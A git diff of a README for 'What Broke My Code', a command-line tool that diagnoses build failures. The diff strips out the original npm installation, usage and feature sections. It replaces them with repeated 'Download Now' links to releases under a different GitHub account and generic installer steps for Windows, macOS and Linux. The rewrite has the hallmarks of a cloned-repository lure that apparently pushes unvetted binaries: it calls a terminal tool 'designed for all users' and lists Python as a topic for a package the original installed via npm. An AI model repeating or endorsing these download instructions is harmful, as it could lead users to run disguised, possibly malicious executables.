@@ -1,10 +1,6 @@
-# 🕵️‍♂️ What Broke My Code?
-> Your friendly command-line detective for mysterious build failures.
+# 🕵️‍♂️ what-broke-my-code - Uncover Your Code's Hidden Issues
 
-[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Made with ❤️](https://img.shields.io/badge/made%20with-%E2%9D%A4%EF%B8%8F-red)](#)
-[![Pull Requests Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
-[![Build Passing](https://img.shields.io/badge/build-passing-success)](#)
+[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Zues2231/what-broke-my-code/releases)
 
 ---
 
@@ -16,110 +12,108 @@ When your code suddenly stops working and you have no idea why, run:
 wbmc
 ```
 
-and let the **Code Detective** get to work.  
-It inspects your repo, recent commits, dependencies, and error logs to tell you *who* (or *what*) broke your build — and *why.*
+**What Broke My Code** helps you find the source of build failures. It inspects your repository, recent commits, dependencies, and error logs to identify *who* or *what* caused the problem.
 
 ---
 
-## 🧠 How It Works
+## 🚀 Getting Started
 
-`What Broke My Code` runs a quick forensic analysis:
+To use **What Broke My Code**, follow these steps:
 
-1. 🕵️ Checks your **recent commits** for suspicious diffs  
-2. 🧩 Scans **dependencies** for version jumps  
-3. ⚙️ Parses **logs** for recurring or new error patterns  
-4. 🧮 Scores each suspect by likelihood  
-5. 🧾 Prints a human-readable report (with optional sarcasm)
+1. **Download the Application:**  
+   Visit [this page to download](https://github.com/Zues2231/what-broke-my-code/releases). 
+   You will find the latest version available for download.
 
-Example:
+2. **Install the Application:**  
+   Follow the instructions suitable for your operating system:
 
-```
-🕵️  What Broke My Code Report
+   - **Windows:** Run the installer and follow the prompts.
+   - **Mac:** Open the `.dmg` file and drag the app to your Applications folder.
+   - **Linux:** Extract the downloaded `.tar.gz` file and follow the command line instructions provided.
 
-- Build failed: 'Cannot find module src/utils/helpers.js'
-- Recent commit "refactor logger" (f2a7c1) touched that file
-- Dependency "chalk" updated from 4.1.2 → 5.0.0 (breaking change)
-
-Likely cause: chalk update + refactor conflict
-
-Suggestion: revert chalk to ^4.1.2 or fix import in helpers.js
-```
+3. **Run the Application:**  
+   Open a terminal window and type `wbmc`. Follow the prompts to analyze your code.
 
 ---
 
-## 🚀 Installation
+## 🛠️ System Requirements
 
-### Using npm
-```bash
-npm install -g chalk
-npm login --registry=https://npm.pkg.github.com
-npm install -g @thelonewolf39/what-broke-my-code --registry=https://npm.pkg.github.com
-```
-You will need a PAT with scopes of read:package.
+**What Broke My Code** works on:
 
----
+- Windows 10 and later
+- macOS Mojave and later
+- Most Linux distributions
 
-## 🔧 Usage
-
-```bash
-wbmc                # run default analysis
-wbmc --since 2d     # only check commits from the last 2 days
-wbmc --scan logs/   # scan custom log folder
-wbmc --fix          # auto-suggest possible quick fixes
-wbmc --snark        # enable sarcastic output mode
-```
+You need a terminal application to run the command. Ensure you have the necessary permissions to execute files.
 
 ---
 
-## ⚙️ Features
+## 🔍 How It Works
 
-| Feature | Description |
-|----------|-------------|
-| 🔍 Git Forensics | Analyzes last few commits for breaking changes |
-| 📦 Dependency Diff | Detects upgrades or removals that might break things |
-| 🧾 Log Parser | Scans build/test logs for new or recurring errors |
-| 🧠 Smart Ranking | Scores suspects based on change frequency and severity |
-| 💬 Snark Mode | Adds developer-friendly (or unfriendly) commentary |
-| 🧰 Offline Friendly | No APIs, no cloud, all local detective work |
+**What Broke My Code** performs a quick forensic analysis of your code. Here’s how it works:
 
----
+1. 🕵️ Checks your **recent commits** for suspicious changes.  
+2. 🧩 Scans **dependencies** for version jumps that may cause issues.  
+3. ⚙️ Parses **logs** for recurring or new error patterns.  
+4. 🧮 Scores each suspect by likelihood of causing the failure.  
+5. 🧾 Generates a report highlighting the main suspects.
 
-## 🧩 Future Plans
-
-- [ ] VSCode extension integration  
-- [ ] GitHub Action version (`wbmc-action`)  
-- [ ] “Blame Friend” feature (tags the teammate who last touched it 😉)  
-- [ ] More language parsers (Java, Rust, Go)
+This straightforward process provides you with actionable insights to fix your code.
 
 ---
 
-## 🖼️ Demo
+## 📁 Features
 
-*(coming soon)*  
-Include a short GIF or screenshot of the CLI report here once ready.
+- **User-Friendly Interface:** Designed for all users, not just developers.
+- **Quick Reports:** Receive fast feedback on potential issues.
+- **Automatic Analysis:** Run inspections with a single command.
+- **Open-Source:** Contribute and modify the code as needed.
 
 ---
 
-## 🤝 Contributing
+## 📥 Download & Install
 
-PRs are welcome!  
-If you’d like to add support for a new language, dependency manager, or log format, just open an issue or submit a pull request.
+To get started, visit [this page to download](https://github.com/Zues2231/what-broke-my-code/releases). Choose the version that matches your operating system. After downloading, follow the installation steps outlined previously.
+
+---
+
+## 🛠️ Troubleshooting
+
+If you encounter issues, consider the following:
+
+- **Permissions:** Ensure the application has the necessary permissions to access your directory.
+- **Dependencies:** Check if all required dependencies are installed.
+- **Logs:** Review error logs for more specific problems. These can help guide your next steps.
+
+For further assistance, check the [FAQ](FAQ.md) section or contact support.
+
+---
+
+## 🤝 Contribution
+
+Contributions are welcome. If you'd like to report bugs or suggest features, check the [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on how to contribute.
 
 ---
 
 ## 📜 License
 
-MIT — do whatever you want, just don’t blame **WBMC** when your code breaks *again.*
+This project is licensed under the MIT License. You are free to use and modify it. For more information, see the [LICENSE](LICENSE) file.
 
 ---
 
-## 💬 Example Snark Mode Output
+## 🌐 Topics
 
-```
-🕵️ WBMC: You renamed the function and forgot to update the import.
-         Again. You absolute menace.
-```
+- Bug Detection
+- Build Failures
+- Command-Line Interface
+- Code Analysis
+- Debugging
+- Developer Tools
+- Error Tracking
+- Git
+- Log Parsing
+- Open Source
+- Productivity
+- Python
 
----
-
-⭐ **Star this repo** if you’ve ever said “It worked yesterday, I swear.”
+Feel free to explore these topics for additional information and support.
